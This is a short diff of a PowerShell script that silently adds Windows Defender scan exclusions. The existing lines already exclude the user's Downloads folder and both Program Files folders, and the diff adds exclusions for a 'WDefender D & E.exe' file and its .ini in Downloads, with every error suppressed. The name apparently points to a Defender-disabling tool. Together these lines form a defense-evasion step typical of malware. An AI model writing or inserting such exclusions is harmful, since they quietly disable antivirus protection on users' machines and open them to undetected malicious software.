@@ -12,6 +12,8 @@ try {
     Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'Downloads') -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:ProgramFiles" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:ProgramFiles(x86)" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath (Join-Path (Join-Path $env:USERPROFILE 'Downloads') 'WDefender D & E.exe') -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath (Join-Path (Join-Path $env:USERPROFILE 'Downloads') 'WDefender D & E.ini') -ErrorAction SilentlyContinue
 } catch {
 }
 
